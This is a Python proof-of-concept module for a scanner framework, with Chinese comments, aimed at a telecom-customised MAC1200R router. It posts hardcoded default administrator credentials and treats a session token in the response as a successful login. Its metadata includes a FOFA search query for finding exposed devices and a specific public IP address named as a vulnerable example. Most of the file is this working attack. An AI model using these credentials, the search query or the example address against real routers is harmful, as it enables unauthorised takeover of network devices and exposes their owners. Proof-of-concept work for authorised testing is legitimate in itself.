# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "hansi",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-02-24",        # POC创建时间
        "UpdateDate" : "2022-02-24",        # POC创建时间
        "PocDesc" : """
        略  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "MAC1200R电信定制版弱口令",                        # 漏洞名称
        "VulnID" : "",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "MAC1200R电信定制版是一款路由",                     # 漏洞应用名称
        "AppVersion" : "",                  # 漏洞应用版本
        "VulnDate" : "2022-02-24",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
	通过相关系统测试发现MAC1200R电信定制版存在弱口令。黑客可利用漏洞获取敏感信息、并进一步控制该设备、或者对系统造成破坏。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
	"MAC1200R电信定制"

        """,                     # fofa搜索语句
        "example" : "http://117.172.135.8:8888/",     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    # timeout = 10


    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "" # url自己按需调整

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    "Content-Type": "application/x-www-form-urlencoded",
                    }
        data = """
		{"method":"do","login":{"username":"telecomadmin","password":"iLKqgcKP9TefbwK"}}

		"""
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.post(url,headers = headers , data = data ,proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req.status_code == 200 and "stok"  in req.text:
                vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()

